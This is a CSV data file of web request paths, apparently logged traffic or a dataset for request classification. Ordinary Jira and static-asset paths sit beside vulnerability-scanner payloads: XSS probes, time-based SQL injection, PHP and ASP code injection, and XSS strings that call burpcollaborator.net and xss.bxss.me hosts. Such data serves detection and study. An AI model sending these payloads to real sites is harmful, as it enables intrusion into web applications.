requestUrl,encoder,mode_is
"/hdip/static/js/app.8673862912f22bcced43.js/;Ym9hV
1<ScRiPt>9im5(9298)</ScRiPt>",1371,0
/hdip/static/js/app.8673862912f22bcced43.js/<,1372,0
"/hdip/static/js/app.8673862912f22bcced43.js/<ScRiPt 
>9im5(9502)</ScRiPt>",1373,0
"/hdip/static/js/app.8673862912f22bcced43.js/<ScRiPt 
>YguE(9845)</ScRiPt>",1374,0
/hdip/static/js/app.8673862912f22bcced43.js/<ScRiPt/acu src=//xss.bxss.me/t/xss.js,1375,0
"/hdip/static/js/app.8673862912f22bcced43.js/<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo=' invalid='9359'>",1376,0
"/hdip/static/js/app.8673862912f22bcced43.js/<img/src=""//xss.bxss.me/t/dot.gif""onload=YguE(9356)>",1377,0
"/hdip/static/js/app.8673862912f22bcced43.js/<img/src="">"" onerror=alert(9526)>",1378,0
/hdip/static/js/app.8673862912f22bcced43.js/<img<!-- --> src=x onerror=alert(9979);//><!-- -->,1379,0
/hdip/static/js/app.ElCA0MdL'));select pg_sleep(6); -- f22bcced43.js,1380,0
/hdip/static/js/dFNB0Wd4');select pg_sleep(6); -- .8673862912f22bcced43.js,1381,0
/hdip/static/js/fWs1puwh');select pg_sleep(9); -- .5013bbedf6c0508d32c2.js,1382,0
"/hdip/static/js/manifest."";print(md5(acunetix_wvs_security_test));$a=""ad1d5771e9b13dbdad2.js",1383,0
/hdip/static/js/manifest.'+response.write(9300118*9225319)+'ad1d5771e9b13dbdad2.js,1384,0
/hdip/static/js/manifest.'+response.write(9503812*9356872)+'ad1d5771e9b13dbdad2.js,1385,0
"/hdip/static/js/manifest.(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'""+(select(0)from(select(sleep(6)))v)+""*/ad1d5771e9b13dbdad2.js",1386,0
"/hdip/static/js/manifest.3"";print(md5(acunetix_wvs_security_test));$a="".js",1387,0
"/hdip/static/js/manifest.3(select(0)from(select(sleep(3)))v)/*'+(select(0)from(select(sleep(3)))v)+'""+(select(0)from(select(sleep(3)))v)+""*/.js",1388,0
/hdip/static/js/manifest.3CXkmYUJg'));select pg_sleep(3); -- .js,1389,0
/hdip/static/js/manifest.3ad1d5771e9b13dbdad2.js/1<ScRiPt>gF79(9170)</ScRiPt>,1390,0
"/hdip/static/js/manifest.3ad1d5771e9b13dbdad2.js/;8m9Th
1<ScRiPt>gF79(9023)</ScRiPt>",1391,0
/hdip/static/js/manifest.3ad1d5771e9b13dbdad2.js/<a HrEF=jaVaScRiPT:>,1392,0
"/hdip/static/js/manifest.3ad1d5771e9b13dbdad2.js/<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo=' invalid='9687'>",1393,0
"/hdip/static/js/manifest.3ad1d5771e9b13dbdad2.js/<img/src="">"" onerror=alert(9510)>",1394,0
/hdip/static/js/manifest.3ad1d5771e9b13dbdad2.js/<img<!-- --> src=x onerror=alert(9346);//><!-- -->,1395,0
/hdip/static/js/manifest.3ad1d5771e9b13dbdad2.js/<img<!-- --> src=x onerror=alert(9354);//><!-- -->,1396,0
/hdip/static/js/manifest.C0MlYMkb'));select pg_sleep(3); -- ad1d5771e9b13dbdad2.js,1397,0
/hdip/static/js/manifest.UbG72XMG');select pg_sleep(3); -- ad1d5771e9b13dbdad2.js,1398,0
/hdip/static/js/plus/recommend.php,1399,0
"/hdip/static/js/vendor."";print(md5(acunetix_wvs_security_test));$a=""bbedf6c0508d32c2.js",1400,0
"/hdip/static/js/vendor.(select(0)from(select(sleep(3)))v)/*'+(select(0)from(select(sleep(3)))v)+'""+(select(0)from(select(sleep(3)))v)+""*/bbedf6c0508d32c2.js",1401,0
"/hdip/static/js/vendor.5013"";print(md5(acunetix_wvs_security_test));$a="".js",1402,0
/hdip/static/js/vendor.5013'+response.write(9025770*9894075)+'.js,1403,0
/hdip/static/js/vendor.5013'+response.write(9601101*9917108)+'.js,1404,0
/hdip/static/js/vendor.5013';print(md5(acunetix_wvs_security_test));$a='.js,1405,0
"/hdip/static/js/vendor.5013(select(0)from(select(sleep(9)))v)/*'+(select(0)from(select(sleep(9)))v)+'""+(select(0)from(select(sleep(9)))v)+""*/.js",1406,0
/hdip/static/js/vendor.5013Zvoz3bsP'));select pg_sleep(3); -- .js,1407,0
"/hdip/static/js/vendor.5013bbedf6c0508d32c2.js/;3We9A
1<ScRiPt>Wbnv(9860)</ScRiPt>",1408,0
"/hdip/static/js/vendor.5013bbedf6c0508d32c2.js/;b8nN2
1<ScRiPt>Sxsl(9300)</ScRiPt>",1409,0
"/hdip/static/js/vendor.5013bbedf6c0508d32c2.js/<ScRiPt 
>Wbnv(9605)</ScRiPt>",1410,0
/hdip/static/js/vendor.5013bbedf6c0508d32c2.js/<a HrEF=jaVaScRiPT:>,1411,0
"/hdip/static/js/vendor.5013bbedf6c0508d32c2.js/<img/src=""//xss.bxss.me/t/dot.gif""onload=Sxsl(9888)>",1412,0
/hdip/static/js/vendor.5013bbedf6c0508d32c2.js/<img<!-- --> src=x onerror=alert(9765);//><!-- -->,1413,0
"/hdip/static/js/vendor.5013bbedf6c0508d32c2.js/<video><source onerror=""javascript:Wbnv(9423)"">",1414,0
/hdip/static/js/vendor.5013kUAW8Lid');select pg_sleep(3); -- .js,1415,0
/hdip/static/js/wyi5DRWI';select pg_sleep(6); -- .8673862912f22bcced43.js,1416,0
/hdip/static/plus/recommend.php,1417,0
/hdip/static/qFZuxWJ7'));select pg_sleep(9); -- /manifest.3ad1d5771e9b13dbdad2.js,1418,0
/hdip/static/webmail/client/cab/index.php,1419,0
/hdip/static/webmail/client/option/index.php,1420,0
/hdip/temple/S_editor/upload.php,1421,0
/hdip/upload.asp,1422,0
/hdip/upload/mobile/index.php,1423,0
/hdip/user/,1424,0
/hdip/user/zs.php,1425,0
/hdip/wap/index.php,1426,0
/hdip/webmail/client/cab/index.php,1427,0
/hdip/webmail/client/option/index.php,1428,0
/hdip/wenba/my_answer.php,1429,0
/hdip/wp-content/plugins/mailpress/mp-includes/action.php,1430,0
/hdip/zEJWkOI0');select pg_sleep(3); -- /js/manifest.3ad1d5771e9b13dbdad2.js,1431,0
/hdip/zhidao/user.php,1432,0
/hdipUser/job/lib/AP_Resume_Position.asp,1433,0
/hdipUser/job/lib/AP_Resume_workcity.asp,1434,0
/hdipalert(1)/,1435,0
/heartbeat,1436,0
/help.php,1437,0
/hm3.gif,1438,0
/hm5.gif,1439,0
/home/hit/v.gif,1440,0
/home/login,1441,0
/homeV7Logger/send,1442,0
/hotquery/index,1443,0
/html/gamehelper/api/version1.5.json,1444,0
/html/js/misc/swfupload//swfupload.swf,1445,0
/html/js/misc/swfupload//swfupload_f8.swf,1446,0
/html/js/misc/swfupload//swfupload_f9.swf,1447,0
/html/yui/uploader/assets/uploader.swf,1448,0
/htsearch,1449,0
/httpmon.php,1450,0
/hwmarket/api/externalApi2,1451,0
/hz/,1452,0
/i/a.gif,1453,0
/i/e.gif,1454,0
/ies/network/hotsoon/,1455,0
/iflow/api/v1/client_event,1456,0
/ihelp/usp/usp/common/css/usphomev3.css,1457,0
/ihelp/usp/usp/common/js/uspJS.js,1458,0
/iisadmpwd/cmd.exe,1459,0
/iku/log/acc,1460,0
/image,1461,0
/image/a011.jpg,1462,0
/image/a014.jpg,1463,0
/images/,1464,0
/images/api/sms_check.php,1465,0
/images/bg/01.gif,1466,0
/images/blank.gif,1467,0
/images/comment/api/index.php,1468,0
/images/common/2019-08-12-pic01.png,1469,0
/images/common/close400.png,1470,0
/images/common/wxpn-code.png,1471,0
/images/config-browser/showConfig.action,1472,0
/images/extsugg/sogoutip.gif,1473,0
/images/favicon.ico,1474,0
/images/icons/profilepics/default.png,1475,0
/images/mobilecode/T1_bVeXgikXXXXXXXX_100x8000_.webp,1476,0
/images/mobilecode/T1caFgXcloXXXXXXXX_100x8000_.webp,1477,0
/images/mobilecode/TB1670ebT8yDuNjm2FkSut_eXXa_140x8000_.webp,1478,0
/images/mobilecode/TB1TR7KXwVD81Jjm2GEXXbQlXXa_100x8000_.webp,1479,0
/images/mycenter/error.jpg,1480,0
/images/mycenter/success.jpg,1481,0
/images/nzcms/left2.gif,1482,0
/images/nzcms/left_bg2.jpg,1483,0
/images/nzcms/list_news_bg.gif,1484,0
/images/nzcms/nzcms.07.gif,1485,0
/images/nzcms/nzcms.077.gif,1486,0
/images/nzcms/nzcms_left_bg.gif,1487,0
/images/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile,1488,0
/images/shared/download_buttons/get_flash_player.gif,1489,0
/images/solr/{{core}}/select,1490,0
/images/track.gif,1491,0
/images/two/zwxx.gif,1492,0
/images/wls-wsat/CoordinatorPortType,1493,0
/ime_push/file.php,1494,0
/ime_push/getPopupIni.php,1495,0
/ime_push/getxinci.php,1496,0
/imewis/msugg,1497,0
/img/10.gif,1498,0
/img_w/wmts,1499,0
/imp/request.s,1500,0
/inc/uploadify/uploadify.swf,1501,0
/include/yui/uploader/assets/uploader.swf,1502,0
/includes/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php,1503,0
/includes/js/uploadify/uploadify.swf,1504,0
/includes/plupload//plupload.flash.swf,1505,0
/includes/swfupload//swfupload.swf,1506,0
/includes/swfupload//swfupload_f8.swf,1507,0
/includes/swfupload//swfupload_f9.swf,1508,0
/index.aspx,1509,0
/index.html,1510,0
/index.php,1511,0
/index.pl,1512,0
/indexAction,1513,0
/indexAction!index,1514,0
/info.php,1515,0
/info/iIndex.jsp,1516,0
/info/nIndex.jsp,1517,0
/infoline,1518,0
/infoline/style/cardList,1519,0
/insertorder.cfm,1520,0
/irpt/i/modifyserveruserinfo.jsp,1521,0
/issues/,1522,0
"/it/u=2700192861,2589591216&fm=202&src=765&ernie&mola=new&crop=v1",1523,0
"/it/u=3954637111,4094682867&fm=202&src=608&ernie_sim_online",1524,0
/itv/devRegister/NTE0M2RlNjk4MzA4LzIwMTcwMjI3MTIwMjUzNTEwQklhS3J3YU0xMTY0Mi85LjQuMy45MDYxNg/cba712bce5eaa074cc77228a4c7c10d2,1525,0
"/javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/536dy71yaaujcvqc1d9k7il8wz2tqtshk885vvjkX;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>/selectQuyu",1526,0
"/javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/5flda7dyma6jov2cddlkjix88zet2uuim9a6xwllX;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>/selectName",1527,0
"/javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/7jrfe9h0qcalsx6ehfpmnk1ac1iv6xylqce91zpoX;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>/selectName",1528,0
"/javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/7s0fn9q0zcjl1xfeqfymwkaal1rvfuei69u6hw5lX;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>/initialLevel",1529,0
"/javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/7s0fn9q0zcjl1xfeqfymwkaal1rvfwbk3br8ey2nX;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>/selectPerformance",1530,0
"/javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/8dmg8ab1kd4mmy0fbgjnhlvb62cw0vujmaa7xxlmX;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>/techincalApplication",1531,0
"/javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/8mvghak1tddmvy9fkgsnql4bf2lw9x0lscg93zroX;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>/selectName",1532,0
"/javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/9s2hnbq2zejn1zfgqhyowmacl3rxfyimadyal09pX;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>/selectName",1533,0
"/javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/a0bivcy37fro90nhyi6p4nidt4zynxgl8cw9jz7oX;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>/techincalApplication",1534,0
"/javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/c7kk2e55ehyqg2uj5kdrbppf0660uzxnpedb01oqX;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>/selectEnumerateTA",1535,0
"/javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/caqk5e85hh1qj2xj8kgrepsf3690x1wpogcdz3nsX;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>/selectName",1536,0
"/javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/f0g4giegkxei6d0uw2g5aqujaag34tslj9a1xrlgX;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>",1537,0
"/javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/gzjouix96lqu86mnxo5v3thjsay4m2iqahyel49tX;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>/selectName",1538,0
"/javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/h9rp4j7agm0vi7wo7pfwdurk2b85w51ttkhh47swX;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>/selectEnumerateTA",1539,0
"/javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/hcxp7jaajm3vl7zoapiwguuk5bb5z24qwhke74vtX;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>/selectEnumerate",1540,0
"/javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/kznsumxd6pqy8amrxs5z3xhnsey8m6rujl7iu8ixX;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>/techincalApplication",1541,0
"/javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/od5w8qbhkt42me0vbwj3h1vr6icc0cv0nrboyem3X;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>/login",1542,0
"/javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/tol1jvmmvyf7xjb0m1u8s66whnnhbfd35utrgh46X;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>/selectName",1543,0
"/javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/tzw1uvxm6yq78jm0x15836hwsnyhmhq5iw6ttjh8X;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>/techincalApplication",1544,0
"/javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/vdc38xbok049ml02b3jah8vy6pcj0iq6ix6utkh9X;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>/selectQuyu",1545,0
/jcnt;C1;1833;.tibetairlines.com.cn:tvb2c.travelsky.com;sw8qHUbyINCfqSCDNVJBNqxsD70=;,1546,0
/jiaoyou.php,1547,0
/jira/browse/BAAS-10,1548,0
/jira/browse/BAAS-18,1549,0
/jira/browse/BAAS/fixforversion/10300,1550,0
/jira/browse/BDSAP,1551,0
/jira/browse/BDSAP-222,1552,0
/jira/browse/BDSAP/fixforversion/10102,1553,0
/jira/browse/CUS/fixforversion/10500,1554,0
/jira/browse/CUS/fixforversion/10600,1555,0
/jira/browse/CUS/fixforversion/10601,1556,0
/jira/browse/PROBLEM,1557,0
/jira/download/resources/com.atlassian.jira.jira-projects-plugin:release-page-assets/page/project/release/image/merge-versions-icon.svg,1558,0
/jira/images/icons/emoticons/flag.png,1559,0
/jira/images/icons/emoticons/help_16.png,1560,0
/jira/images/icons/emoticons/sad.png,1561,0
/jira/images/icons/emoticons/smile.png,1562,0
/jira/images/icons/emoticons/star_blue.png,1563,0
/jira/images/icons/emoticons/star_green.png,1564,0
/jira/images/icons/emoticons/star_yellow.png,1565,0
/jira/images/icons/emoticons/thumbs_down.png,1566,0
/jira/images/icons/emoticons/warning.png,1567,0
/jira/images/icons/issuetypes/story.svg,1568,0
/jira/images/icons/priorities/highest.svg,1569,0
/jira/issues/,1570,0
/jira/plugins/servlet/gadgets/ifr,1571,0
/jira/plugins/servlet/streams,1572,0
/jira/projects/BDSAP,1573,0
/jira/projects/CUS/issues,1574,0
/jira/projects/IMP/issues,1575,0
/jira/rest/api/1.0/labels/suggest,1576,0
/jira/rest/api/1.0/menus/browse_link,1577,0
/jira/rest/api/1.0/menus/find_link,1578,0
/jira/rest/api/1.0/menus/home_link,1579,0
/jira/rest/api/1.0/shortcuts/805001/ccbf6acf549211986b2c875b4b27ec4b/shortcuts.js,1580,0
/jira/rest/api/2/filter/favourite,1581,0
/jira/rest/api/2/issue/10028/subtask/move,1582,0
/jira/rest/api/2/issue/11423/subtask/move,1583,0
/jira/rest/api/2/issue/11470/subtask/move,1584,0
/jira/rest/api/2/mypreferences,1585,0
/jira/rest/bamboo/latest/deploy/BAAS/BAAS-10,1586,0
/jira/rest/bamboo/latest/deploy/BAAS/BAAS-11,1587,0
/jira/rest/bamboo/latest/deploy/BAAS/BAAS-15,1588,0
/jira/rest/bamboo/latest/deploy/BAAS/BAAS-16,1589,0
/jira/rest/bamboo/latest/deploy/BAAS/BAAS-19,1590,0
/jira/rest/bamboo/latest/deploy/BAAS/BAAS-22,1591,0
/jira/rest/bamboo/latest/deploy/BAAS/BAAS-8,1592,0
/jira/rest/bamboo/latest/deploy/BDSAP/BDSAP-222,1593,0
/jira/rest/bamboo/latest/deploy/BDSAP/BDSAP-230,1594,0
/jira/rest/bamboo/latest/deploy/BDSAP/BDSAP-236,1595,0
/jira/rest/bamboo/latest/deploy/BDSAP/BDSAP-237,1596,0
/jira/rest/bamboo/latest/deploy/CUS/CUS-17,1597,0
/jira/rest/bamboo/latest/deploy/CUS/CUS-44,1598,0
/jira/rest/bamboo/latest/deploy/IMP/IMP-287,1599,0
/jira/rest/bamboo/latest/deploy/IMP/IMP-401,1600,0
/jira/rest/bamboo/latest/deploy/PROBLEM/PROBLEM-103,1601,0
/jira/rest/bamboo/latest/deploy/PROBLEM/PROBLEM-104,1602,0
/jira/rest/bamboo/latest/deploy/PROBLEM/PROBLEM-108,1603,0
/jira/rest/bamboo/latest/deploy/PROBLEM/PROBLEM-110,1604,0
/jira/rest/bamboo/latest/deploy/PROBLEM/PROBLEM-111,1605,0
/jira/rest/bamboo/latest/deploy/PROBLEM/PROBLEM-223,1606,0
/jira/rest/bamboo/latest/deploy/PROBLEM/PROBLEM-309,1607,0
/jira/rest/bamboo/latest/deploy/PROBLEM/PROBLEM-323,1608,0
/jira/rest/bamboo/latest/deploy/PROBLEM/PROBLEM-324,1609,0
/jira/rest/bamboo/latest/deploy/PROBLEM/PROBLEM-325,1610,0
/jira/rest/bamboo/latest/deploy/PROBLEM/PROBLEM-327,1611,0
/jira/rest/bamboo/latest/deploy/PROBLEM/PROBLEM-328,1612,0
/jira/rest/bamboo/latest/deploy/PROBLEM/PROBLEM-329,1613,0
/jira/rest/bamboo/latest/deploy/PROBLEM/PROBLEM-332,1614,0
/jira/rest/bamboo/latest/deploy/PROBLEM/PROBLEM-333,1615,0
/jira/rest/bamboo/latest/deploy/PROBLEM/PROBLEM-343,1616,0
/jira/rest/bamboo/latest/deploy/PROBLEM/PROBLEM-353,1617,0
/jira/rest/bamboo/latest/deploy/PROBLEM/PROBLEM-355,1618,0
/jira/rest/gadget/1.0/issueTable/jql,1619,0
/jira/rest/greenhopper/1.0/xboard/work/allData.json,1620,0
/jira/rest/greenhopper/1.0/xboard/work/transitions.json,1621,0
/jira/rest/hipchat/integrations/1.0/configuration/status,1622,0
/jira/rest/hipchat/integrations/1.0/issuepanel/data/BAAS-11,1623,0
/jira/rest/hipchat/integrations/1.0/issuepanel/data/BAAS-16,1624,0
/jira/rest/hipchat/integrations/1.0/issuepanel/data/BDSAP-181,1625,0
/jira/rest/hipchat/integrations/1.0/issuepanel/data/BDSAP-196,1626,0
/jira/rest/hipchat/integrations/1.0/issuepanel/data/BDSAP-222,1627,0
/jira/rest/hipchat/integrations/1.0/issuepanel/data/BDSAP-230,1628,0
/jira/rest/hipchat/integrations/1.0/issuepanel/data/BDSAP-243,1629,0
/jira/rest/hipchat/integrations/1.0/issuepanel/data/CUS-43,1630,0
/jira/rest/hipchat/integrations/1.0/issuepanel/data/PROBLEM-103,1631,0
/jira/rest/hipchat/integrations/1.0/issuepanel/data/PROBLEM-104,1632,0
/jira/rest/hipchat/integrations/1.0/issuepanel/data/PROBLEM-108,1633,0
/jira/rest/hipchat/integrations/1.0/issuepanel/data/PROBLEM-110,1634,0
/jira/rest/hipchat/integrations/1.0/issuepanel/data/PROBLEM-111,1635,0
/jira/rest/hipchat/integrations/1.0/issuepanel/data/PROBLEM-309,1636,0
/jira/rest/hipchat/integrations/1.0/issuepanel/data/PROBLEM-323,1637,0
/jira/rest/hipchat/integrations/1.0/issuepanel/data/PROBLEM-324,1638,0
/jira/rest/hipchat/integrations/1.0/issuepanel/data/PROBLEM-325,1639,0
/jira/rest/hipchat/integrations/1.0/issuepanel/data/PROBLEM-327,1640,0
/jira/rest/hipchat/integrations/1.0/issuepanel/data/PROBLEM-329,1641,0
/jira/rest/inline-create/1.0/context/bootstrap,1642,0
/jira/rest/internal/2/user/mention/search,1643,0
/jira/rest/issueNav/1/issueTable/stable,1644,0
/jira/rest/menu/latest/appswitcher,1645,0
/jira/rest/orderbycomponent/latest/orderByOptions,1646,0
/jira/rest/projects/1.0/project/BAAS/release/allversions,1647,0
/jira/rest/projects/1.0/project/BDSAP/rapidviews,1648,0
/jira/rest/projects/1.0/project/CUS/release/allversions,1649,0
/jira/rest/projects/1.0/project/IMP/lastVisited,1650,0
/jira/rest/projects/1.0/project/PROBLEM/lastVisited,1651,0
/jira/rest/projects/1.0/project/PROBLEM/release/allversions,1652,0
/jira/rest/release-report/1.0/tab/content/BDSAP/10507,1653,0
/jira/rest/troubleshooting/1.0/check/chengang.hong,1654,0
/jira/rest/troubleshooting/1.0/check/delin,1655,0
/jira/rest/troubleshooting/1.0/check/hoisan.bao,1656,0
/jira/rest/troubleshooting/1.0/check/shaco.zhu,1657,0
/jira/s/03487a8285231897dc71b7079141b1f5-CDN/l3runm/805001/6411e0087192541a09d88223fb51a6a0/1.0/_/download/batch/jira.webresources:frother-queryable-dropdown-select/jira.webresources:frother-queryable-dropdown-select.js,1658,0
/jira/s/03487a8285231897dc71b7079141b1f5-CDN/l3runm/805001/6411e0087192541a09d88223fb51a6a0/1.0/_/download/batch/jira.webresources:jira-fields/jira.webresources:jira-fields.js,1659,0
/jira/s/03487a8285231897dc71b7079141b1f5-CDN/l3runm/805001/6411e0087192541a09d88223fb51a6a0/5.1.14/_/download/batch/com.atlassian.jira.jira-projects-plugin:components-page-assets/com.atlassian.jira.jira-projects-plugin:components-page-assets.js,1660,0
/jira/s/03487a8285231897dc71b7079141b1f5-CDN/l3runm/805001/6411e0087192541a09d88223fb51a6a0/8.5.1/_/download/batch/com.atlassian.jira.jira-project-config-plugin:project-config-component-views/com.atlassian.jira.jira-project-config-plugin:project-config-component-views.js,1661,0
/jira/s/0f3be380b1d7f849cd64bb17740494d6-CDN/l3runm/805001/6411e0087192541a09d88223fb51a6a0/2.0.2/_/download/batch/com.atlassian.plugins.issue-status-plugin:issue-status-resources/com.atlassian.plugins.issue-status-plugin:issue-status-resources.js,1662,0
/jira/s/0f3be380b1d7f849cd64bb17740494d6-CDN/l3runm/805001/6411e0087192541a09d88223fb51a6a0/8.5.1/_/download/batch/com.atlassian.jira.jira-project-config-plugin:project-config-global-resources/com.atlassian.jira.jira-project-config-plugin:project-config-global-resources.js,1663,0
/jira/s/0f3be380b1d7f849cd64bb17740494d6-CDN/l3runm/805001/6411e0087192541a09d88223fb51a6a0/8.5.1/_/download/batch/com.atlassian.jira.jira-project-config-plugin:templates-messages/com.atlassian.jira.jira-project-config-plugin:templates-messages.js,1664,0
"/jira/s/2304946f309fa86d2d2eadca72420135-CDN/l3runm/805001/6411e0087192541a09d88223fb51a6a0/27918a065c0bb77e059e744d84390399/_/download/contextbatch/css/com.atlassian.jira.plugins.jira-development-integration-plugin:8,-_super/batch.css",1665,0
/jira/s/26d79b50d075377fdcc2e24a15d5ab7e-CDN/l3runm/805001/6411e0087192541a09d88223fb51a6a0/e5dce8c22f35f6ae877a09c446155e80/_/download/contextbatch/css/_super/batch.css,1666,0
"/jira/s/3e3837d9c65afc213e83b494214a1572-T/l3runm/805001/6411e0087192541a09d88223fb51a6a0/bf2a702f7804429946c24ede1d4f451b/_/download/contextbatch/js/com.atlassian.jira.plugins.jira-development-integration-plugin:0,-_super,-jira.view.issue,-jira.global,-atl.general,-project.issue.navigator,-jira.rich.editor.api/batch.js",1667,0
"/jira/s/44755786fa0e35e8c5c3adb9b8c60478-T/l3runm/805001/6411e0087192541a09d88223fb51a6a0/bf2a702f7804429946c24ede1d4f451b/_/download/contextbatch/css/com.atlassian.jira.plugins.jira-development-integration-plugin:0,-_super,-jira.view.issue,-jira.global,-atl.general,-project.issue.navigator,-jira.rich.editor.api/batch.css",1668,0
"/jira/s/5233e55a9880ce43e11db800370bbf48-CDN/l3runm/805001/6411e0087192541a09d88223fb51a6a0/410391238bef4015b8f9eff45f1d5586/_/download/contextbatch/css/jira.project.sidebar,atl.general,jira.global,com.atlassian.jira.projects.sidebar.init,-_super/batch.css",1669,0
"/jira/s/52903704a4044e2f21455a9618770271-CDN/l3runm/805001/6411e0087192541a09d88223fb51a6a0/c3076c3d768ad56b438ec7c97ee18104/_/download/contextbatch/js/atl.admin,jira.global,jira.admin,-_super/batch.js",1670,0
/jira/s/65b2ef15f0363d67bfc17477e002f9b4-CDN/l3runm/805001/6411e0087192541a09d88223fb51a6a0/1.0/_/download/batch/jira.webresources:list-styles/jira.webresources:list-styles.css,1671,0
"/jira/s/66f35932f7076d4a6ae4d9cb9b18e44f-T/l3runm/805001/6411e0087192541a09d88223fb51a6a0/6161f68e2e3d5ec9460eb6d9dc34472e/_/download/contextbatch/js/jira.rich.editor.api,jira.project.sidebar,jira.rich.editor,com.atlassian.jira.plugins.jira-development-integration-plugin:0,-_super,-jira.view.issue,-jira.global,-atl.general,-com.atlassian.jira.projects.sidebar.init,-project.issue.navigator/batch.js",1672,0
"/jira/s/68a0017dc25b195a1bb4789e633c25cf-T/l3runm/805001/6411e0087192541a09d88223fb51a6a0/32500facf1b8edf8eb74f5568d000d92/_/download/contextbatch/js/jira.rich.editor.api,jira.project.sidebar,jira.rich.editor,-_super,-jira.view.issue,-jira.global,-atl.general,-com.atlassian.jira.projects.sidebar.init,-project.issue.navigator/batch.js",1673,0
